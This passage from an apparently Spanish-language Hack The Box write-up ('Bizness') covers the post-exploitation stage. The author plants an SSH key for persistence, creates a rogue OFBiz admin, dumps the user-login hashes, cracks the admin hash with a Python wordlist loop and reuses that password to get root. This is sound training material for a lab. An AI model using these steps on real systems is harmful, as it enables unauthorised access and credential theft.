+ofbiz@bizness:~$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4oqlyZPkeS8Y5Tr32uf4M8nkW5U9ySBUP9C9yw9kVCspp4x3lM/jLx4goHAMmsh3CTpW4T34g0//9Q0yfbX1PSPU50lIiHXYOmgSePTmbvOZsFKMJmTE0k+DoktIykYuIkmiSQf/9ea2V8M/ew1Zh7KqD7j2WRw1iWNBmRr21AZKJ26kWZfRZ1mBJL4/Kei/DviXTDZbKG3ENLYTd5gzIKk7OGrYzeCIfgeMgZ5RjQPcg0mPy8XECs4L+mKRY9lCMMxyf6Cgr45Zyr5XuPa/vulwGc5Wgp3nAmS7trC1bY2UMQNaH6TnheizMHOnWdH/lNJHsWkfjIHjryEzvBpgXQFcJnTUUq5QnCLAYOrrYmFc6mG2HlNx+JbZkZy1BfLLUFzx3jc3E4tBt/qUqw5tuAbrRxw0VH/reCtKcTZGFASrjcxRO4e73hx63bnVoMhMD0bOtlr6RRtYThOvra4Ueq73vd6waKNfouo7h8/wDavBPkxIstLMxziMP9dZg7X0=' > ~/.ssh/authorized_keys  
+</code></pre></div><p>Ahora podemos acceder a través de SSH sin contraseña y crear una nueva cuenta de administrador para OFBiz:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> ofbiz@bizness.htb
+Linux bizness 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jan 10 12:14:22 2024 from 10.10.14.134
+<span class="code-green">ofbiz@bizness</span>:<span class="code-blue">~</span>$ cd /opt/ofbiz/
+<span class="code-green">ofbiz@bizness</span>:<span class="code-blue">/opt/ofbiz</span>$ ./gradlew 'ofbiz --shutdown'
+&gt; Task :compileJava UP-TO-DATE
+&gt; Task :compileGroovy UP-TO-DATE
+&gt; Task :processResources UP-TO-DATE
+&gt; Task :classes UP-TO-DATE
+&gt; Task :jar UP-TO-DATE
+&gt; Task :startScripts UP-TO-DATE
+&gt; Task :distTar UP-TO-DATE
+&gt; Task :distZip UP-TO-DATE
+&gt; Task :assemble UP-TO-DATE
+&gt; Task :checkstyleMain UP-TO-DATE
+&gt; Task :compileTestJava UP-TO-DATE
+&gt; Task :compileTestGroovy UP-TO-DATE
+&gt; Task :processTestResources NO-SOURCE
+&gt; Task :testClasses UP-TO-DATE
+&gt; Task :checkstyleTest UP-TO-DATE
+&gt; Task :test UP-TO-DATE
+&gt; Task :check UP-TO-DATE
+&gt; Task :build UP-TO-DATE
+
+&gt; Task :ofbiz --shutdown
+Config.java using configuration file start.properties
+...
+</span>&gt; Task :ofbiz --shutdown
+Config.java using configuration file start.properties
+Set OFBIZ_HOME to - /opt/ofbiz
+Shutting down server : OK
+
+BUILD SUCCESSFUL in 4s
+13 actionable tasks: 1 executed, 12 up-to-date
+<span class="code-green">ofbiz@bizness</span>:<span class="code-blue">/opt/ofbiz</span>$ ./gradlew loadAdminUserLogin -PuserLoginId=myadmin  
+&gt; Task :compileJava UP-TO-DATE
+&gt; Task :compileGroovy UP-TO-DATE
+&gt; Task :processResources UP-TO-DATE
+&gt; Task :classes UP-TO-DATE
+&gt; Task :jar UP-TO-DATE
+&gt; Task :startScripts UP-TO-DATE
+&gt; Task :distTar UP-TO-DATE
+&gt; Task :distZip UP-TO-DATE
+&gt; Task :assemble UP-TO-DATE
+&gt; Task :checkstyleMain UP-TO-DATE
+&gt; Task :compileTestJava UP-TO-DATE
+&gt; Task :compileTestGroovy UP-TO-DATE
+&gt; Task :processTestResources NO-SOURCE
+&gt; Task :testClasses UP-TO-DATE
+&gt; Task :checkstyleTest UP-TO-DATE
+&gt; Task :test UP-TO-DATE
+&gt; Task :check UP-TO-DATE
+&gt; Task :build UP-TO-DATE
+
+&gt; Task :executeLoadAdminUser
+Config.java using configuration file load-data.properties
+...
+</span>&gt; Task :loadAdminUserLogin
+
+BUILD SUCCESSFUL in 25s
+14 actionable tasks: 2 executed, 12 up-to-date
+<span class="code-green">ofbiz@bizness</span>:<span class="code-blue">/opt/ofbiz</span>$ ./gradlew 'ofbiz --start'
+&gt; Task :compileJava UP-TO-DATE
+&gt; Task :compileGroovy UP-TO-DATE
+&gt; Task :processResources UP-TO-DATE
+&gt; Task :classes UP-TO-DATE
+&gt; Task :jar UP-TO-DATE
+&gt; Task :startScripts UP-TO-DATE
+&gt; Task :distTar UP-TO-DATE
+&gt; Task :distZip UP-TO-DATE
+&gt; Task :assemble UP-TO-DATE
+&gt; Task :checkstyleMain UP-TO-DATE
+&gt; Task :compileTestJava UP-TO-DATE
+&gt; Task :compileTestGroovy UP-TO-DATE
+&gt; Task :processTestResources NO-SOURCE
+&gt; Task :testClasses UP-TO-DATE
+&gt; Task :checkstyleTest UP-TO-DATE
+&gt; Task :test UP-TO-DATE
+&gt; Task :check UP-TO-DATE
+&gt; Task :build UP-TO-DATE
+
+&gt; Task :ofbiz --start
+Config.java using configuration file start.properties
+...
+</code></pre></div><p>En este punto, podemos ir a la web y acceder usando credenciales <code>myadmin:ofbiz</code>. Luego, el servicio nos pedirá que creemos una nueva contraseña:</p><p><img alt="Bizness 6" src="/images/HTB/Bizness/Bizness-6.webp"></p><p>Y llegaremos al panel de administración:</p><p><img alt="Bizness 7" src="/images/HTB/Bizness/Bizness-7.webp"></p><p>Después de un poco de tiempo navegando por todas las opciones, encontramos el lugar correcto para hacer una copia de seguridad de la base de datos a un archivo XML:</p><p><img alt="Bizness 8" src="/images/HTB/Bizness/Bizness-8.webp"></p><p>En realidad, podemos elegir qué entidades (tablas SQL) incluir en la copia de seguridad. Estamos interesados ​​en <code>UserLogin</code>:</p><p><img alt="Bizness 9" src="/images/HTB/Bizness/Bizness-9.webp"></p><p>Una vez realizada la copia de seguridad, podemos encontrarla en <code>/dev/shm</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">ofbiz@bizness</span>:<span class="code-blue">/opt/ofbiz</span>$ cat /dev/shm/userlogin.xml
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;entity-engine-xml&gt;
+    &lt;UserLogin userLoginId="myadmin" currentPassword="$SHA$pyNT3jL.yRQVp$UbBJA0WEd6NCPzOJhCv5hBUIz1k" enabled="Y" hasLoggedOut="N" requirePasswordChange="N" l
+astTimeZone="Europe/Madrid" lastUpdatedStamp="2024-01-10 12:18:18.889" lastUpdatedTxStamp="2024-01-10 12:18:18.826" createdStamp="2024-01-10 12:16:27.176" cre
+atedTxStamp="2024-01-10 12:16:26.925"/&gt;
+    &lt;UserLogin userLoginId="admin" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" requirePasswordChange="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445"/&gt;  
+    &lt;UserLogin userLoginId="anonymous" enabled="N" lastUpdatedStamp="2023-12-16 03:38:54.747" lastUpdatedTxStamp="2023-12-16 03:38:54.284" createdStamp="2023-12-16 03:38:54.747" createdTxStamp="2023-12-16 03:38:54.284"/&gt;
+    &lt;UserLogin userLoginId="system" isSystem="Y" enabled="N" lastUpdatedStamp="2023-12-16 03:39:04.584" lastUpdatedTxStamp="2023-12-16 03:39:04.538" createdStamp="2023-12-16 03:38:54.694" createdTxStamp="2023-12-16 03:38:54.284" partyId="system"/&gt;
+&lt;/entity-engine-xml&gt;
+</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Aquí tenemos algunas credenciales y <em>hashes</em> de contraseñas. Estamos interesados en romper el <em>hash</em> de <code>admin</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I  
+</code></pre></div><p>Este es un formato personalizado diseñado por OFBiz, por lo que tendremos que sumergirnos en el código y buscar el formato real. Si simplemente buscamos por esto, obtendremos esta <a target="_blank" href="https://nightlies.apache.org/ofbiz/next/javadoc/org/apache/ofbiz/base/crypto/HashCrypt.html">documentación</a>.</p><p>Mirando la ruta del paquete (<code>ofbiz.base.crypto.HashCrypt</code>) podemos buscar fácilmente en el <a target="_blank" href="https://github.com/apache/ofbiz-framework">repositorio oficial</a> y encontrar el archivo relevante: <a target="_blank" href="https://github.com/apache/ofbiz-framework/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java">HashCrypt.java</a>. Nos centraremos en estos dos métodos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">String</span><span class="mtk1"> </span><span class="mtk8">cryptBytes</span><span class="mtk1">(</span><span class="mtk7 mtki">String</span><span class="mtk1"> </span><span class="mtk9 mtki">hashType</span><span class="mtk1">, </span><span class="mtk7 mtki">String</span><span class="mtk1"> </span><span class="mtk9 mtki">salt</span><span class="mtk1">, </span><span class="mtk7 mtki">byte</span><span class="mtk1">[] </span><span class="mtk9 mtki">bytes</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (hashType </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">) {</span>
+<span class="mtk1">            hashType </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"SHA"</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (salt </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">) {</span>
+<span class="mtk1">            salt </span><span class="mtk5">=</span><span class="mtk1"> RandomStringUtils.</span><span class="mtk8">random</span><span class="mtk1">(SECURE_RANDOM.</span><span class="mtk8">nextInt</span><span class="mtk1">(</span><span class="mtk6">15</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, CRYPT_CHAR_SET);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">StringBuilder</span><span class="mtk1"> sb </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">StringBuilder</span><span class="mtk1">();</span>
+<span class="mtk1">        sb.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk4">"$"</span><span class="mtk1">).</span><span class="mtk8">append</span><span class="mtk1">(hashType).</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk4">"$"</span><span class="mtk1">).</span><span class="mtk8">append</span><span class="mtk1">(salt).</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk4">"$"</span><span class="mtk1">);</span>
+<span class="mtk1">        sb.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk8">getCryptedBytes</span><span class="mtk1">(hashType, salt, bytes));</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> sb.</span><span class="mtk8">toString</span><span class="mtk1">();</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">String</span><span class="mtk1"> </span><span class="mtk8">getCryptedBytes</span><span class="mtk1">(</span><span class="mtk7 mtki">String</span><span class="mtk1"> </span><span class="mtk9 mtki">hashType</span><span class="mtk1">, </span><span class="mtk7 mtki">String</span><span class="mtk1"> </span><span class="mtk9 mtki">salt</span><span class="mtk1">, </span><span class="mtk7 mtki">byte</span><span class="mtk1">[] </span><span class="mtk9 mtki">bytes</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
+<span class="mtk1">            </span><span class="mtk7 mtki">MessageDigest</span><span class="mtk1"> messagedigest </span><span class="mtk5">=</span><span class="mtk1"> MessageDigest.</span><span class="mtk8">getInstance</span><span class="mtk1">(hashType);</span>
+<span class="mtk1">            messagedigest.</span><span class="mtk8">update</span><span class="mtk1">(salt.</span><span class="mtk8">getBytes</span><span class="mtk1">(StandardCharsets.UTF_8));</span>
+<span class="mtk1">            messagedigest.</span><span class="mtk8">update</span><span class="mtk1">(bytes);</span>
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> Base64.</span><span class="mtk8">encodeBase64URLSafeString</span><span class="mtk1">(messagedigest.</span><span class="mtk8">digest</span><span class="mtk1">()).</span><span class="mtk8">replace</span><span class="mtk1">(</span><span class="mtk4">'+'</span><span class="mtk1">, </span><span class="mtk4">'.'</span><span class="mtk1">);</span>  
+<span class="mtk1">        } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk7 mtki">NoSuchAlgorithmException</span><span class="mtk1"> </span><span class="mtk9 mtki">e</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GeneralRuntimeException</span><span class="mtk1">(</span><span class="mtk4">"Error while comparing password"</span><span class="mtk1">, e);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+</code></pre></div><p>Como se puede ver, el formato del <em>hash</em> es <code>$&lt;hash-type>$&lt;salt>$urlsafe_base64_encode(&lt;message-digest>)</code>, y el resumen del mensaje se calcula como <code>hash-type(salt | message-digest)</code>.</p><p>Para romper el <em>hash</em>, usaré Python REPL y <code>rockyou.txt</code> (obsérvese que necesitamos agregar un signo <code>=</code> debido al relleno de Base64):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; from base64 import urlsafe_b64decode
+&gt;&gt;&gt; from hashlib import sha1
+&gt;&gt;&gt;
+&gt;&gt;&gt; salt = b'd'
+&gt;&gt;&gt; message_digest = urlsafe_b64decode('uP0_QaVBpDWFeo8-dRzDqRwXQ2I=')  
+&gt;&gt;&gt;
+&gt;&gt;&gt; with open('rockyou.txt', 'rb') as f:
+...     while (password := f.readline()):
+...         if message_digest == sha1(salt + password.strip()).digest():
+...             print(password.strip().decode())
+...             break
+...
+monkeybizness
+</code></pre></div><p>Y ahí tenemos la contraseña. En este punto, podemos intentar reutilizar esta contraseña para el usuario <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">ofbiz@bizness</span>:<span class="code-blue">/opt/ofbiz</span>$ su root  
+Password:
+root@bizness:/opt/ofbiz# cd
+root@bizness:~# cat root.txt
+6609d076350235f1d67413859dd84d1f
+</code></pre></div><p>¡Ya tenemos acceso <code>root</code>!</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#_exploit_-de-ofbiz"><em>Exploit</em> de OFBiz</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a><ul><li><a href="#copia-de-seguridad-de-la-base-de-datos">Copia de seguridad de la base de datos</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
